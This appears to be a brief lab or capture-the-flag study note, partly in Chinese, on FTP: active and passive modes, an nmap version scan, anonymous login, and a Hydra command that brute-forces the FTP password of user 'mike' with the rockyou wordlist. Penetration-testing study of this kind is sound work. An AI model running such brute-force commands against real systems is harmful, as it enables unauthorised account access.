File transfer protocol

FTP session:
* command
* data channel

Active:
* Client opens port and listen, server connect to it
Passive:
* Server opens port

user port 21

check ftp version
```bash
nmap -p 21 -sV 21 10.10.8.243 
```

login with anonymous
```bash
ftp 10.10.8.243
```

account : anonymous
password : 

從PUBLIC_NOTICE.txt得到可能的username：mike
利用 `Hydra`暴力破解

Hydra支援超過50個常見 protocol像telnet ssh ftp

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.8.243 ftp
```

* -`t 4` : 4 parallel connection
* `-l <user>`
* `-P <password-dict>`
* `-vV` very verbose